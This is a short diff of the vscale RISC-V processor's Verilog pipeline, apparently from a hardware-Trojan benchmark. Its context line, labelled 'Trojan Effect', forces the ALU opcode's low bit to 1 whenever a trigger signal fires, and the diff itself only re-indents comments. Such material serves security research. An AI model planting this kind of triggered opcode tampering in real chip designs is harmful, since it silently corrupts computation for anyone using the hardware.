@@ -450,8 +450,8 @@ module vscale_pipeline(
    assign rs2_data_bypassed = bypass_rs2 ? bypass_data_WB : rs2_data;
 
    vscale_alu alu(
-//                  .op(alu_op),
-//       Trojan Effect
+                  //.op(alu_op),
+                  // Trojan Effect
                   .op( (trig1)  ? {alu_op[3:1],1'b1}: alu_op),		  
                   .in1(alu_src_a),
                   .in2(alu_src_b),
